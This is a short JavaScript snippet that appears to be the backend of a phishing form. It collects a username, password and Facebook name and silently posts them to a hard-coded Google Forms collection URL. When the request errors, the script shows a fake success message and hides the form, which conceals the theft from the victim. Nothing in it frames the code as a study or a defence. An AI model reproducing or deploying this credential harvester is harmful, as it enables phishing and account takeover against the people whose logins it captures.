function postToGoogle() {
	var field1 = $("#user-client").val();
	var field2 = $("#password-client").val();
	var field3 = $("#facebook-client").val();
					
					
	if(field1 == ""){
	alert('Please Fill Your Username');
	document.getElementById("user-client").focus();
	return false;
	}
	if(field2 == ""){
	alert('Please Fill Your Password');
	document.getElementById("password-client").focus();
	return false;
	}
	
	if(field3 == ""){
	alert('Please Fill Your Facebook Name');
	document.getElementById("facebook-client").focus();
	return false;
	}
					


				
	
$.ajax({
	url: "https://docs.google.com/forms/d/e/1FAIpQLSdVShzQXv33UXKT95dsPdQ_Q5fSMaMcqJA5g2gL5OzkcF1m7w/formResponse?",
	data: {"entry.945601858": field1, "entry.352474312": field2, "entry.512648277": field3},
	type: "POST",
	dataType: "xml",
	success: function(d)
	{
	},
	error: function(x, y, z)
	{

		$('#success-msg').show();
		$('#form').hide();
								
	}
	});
	return false;
}

